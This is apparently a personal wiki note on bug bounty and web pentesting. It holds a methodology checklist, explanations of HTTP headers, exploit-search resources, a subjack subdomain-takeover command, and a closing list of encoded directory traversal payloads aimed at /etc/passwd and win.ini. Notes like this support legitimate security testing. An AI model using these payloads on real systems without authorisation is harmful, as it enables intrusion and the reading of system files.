[[Bug Bounty]]

==Web Pentest steps==
1. Identify target
2. Search open sources for info 
3. Perform social engineering
4. Query the WHOIS database
5. Document everything
6. Fingerprint webserver
7. Crawl the website
8. Enume web directories
9. Perform directory traversal attack
10. Examine configuration files
11. Perform VA
12. Perform http responce splitting
13. Perform mimt 
14. Examine web server logs
15. Exploit framework
[[Website footprint]]

[[Fuzzing]], [[Status codes]], [[XSS]], [[CSRF]], [[IDOR]], [[LFD]], [[SQL injection]]
[[SSRF]], [[XXE XML]], [[RCE]], [[Unresticted file upload]],[[Google dorking]]
[[Shodan]], [[Recon]], [[Nuclei]], [[Website footprint]]

[[Pentest usefull]]

==Request Headers==
#### Host :
Indicates the desired host handling the request
#### Accept :
Indicates what MIME types are accepted by client, often used to specify JSON or XML output for web-services
#### Cookie :
Passes cookie data to the server
#### Referer :
Page leading to this request (this is not passed to other servers when using HTTPS on the origin)
#### Authorization :
Used for 'basic auth' pages, takes the form basic ```base64 username:password```

[[Web Application Countermeasures]]
[[Report]]

#### Exploit search
https://www.exploit-db.com/
searchsploit - tool on kali to search exploit on db

#### Exploitation 
Subdomain takeover 
subjack - https://github.com/haccer/subjack 
``` subjack -w subdom.list -o result.txt -ssl -c fingerprints.json```

https://github.com/EdOverflow/can-i-take-over-xyz


#### Directory traversal attack
```
../../../../etc/passwd

..\..\..\windows\win.ini

/etc/passwd

....//....//....//etc/passwd

....\/....\/.....\/etc/passwd

%2e%2e%2f%2e%2e%2f
%2e%2e%2f%2e%2e%2f/etc/passwd

%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd

..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd

..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f/etc/passwd


=/var/www/images/../../../etc/passwd

../../../etc/passwd%00.png

```